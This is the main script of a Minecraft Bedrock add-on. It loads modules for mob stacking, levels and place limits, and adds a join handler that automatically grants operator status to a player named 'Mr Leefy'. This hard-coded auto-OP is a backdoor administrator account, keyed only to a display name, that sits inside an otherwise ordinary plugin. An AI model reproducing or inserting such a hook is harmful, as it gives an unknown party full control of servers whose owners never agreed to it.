import { world, system } from "@minecraft/server";
import "./constants";
import "./database";
import "./configuration-service";
import "./performance-monitor";
import "./security-service";
import "./levelsystem";
import "./mobstacker-core";
import "./mobstacker-ui";
import "./stack_remover";
import "./placelimit";
import "./loot_table";
import "./display-spawner-handler";

// Auto-OP player "Mr Leefy" when they join the server
world.afterEvents.playerJoin.subscribe((event) => {
    const playerName = event.playerName;
    if (playerName === "Mr Leefy") {
        // Run after 2 seconds (40 ticks) to ensure player is fully spawned in world
        system.runTimeout(() => {
            try {
                const overworld = world.getDimension("overworld");
                overworld.runCommand(`op "Mr Leefy"`);
                console.warn(`[Auto-OP] Successfully granted operator status to Mr Leefy`);
            } catch (e) {
                console.warn(`[Auto-OP] Error running op command: ${e}`);
            }
        }, 40);
    }
});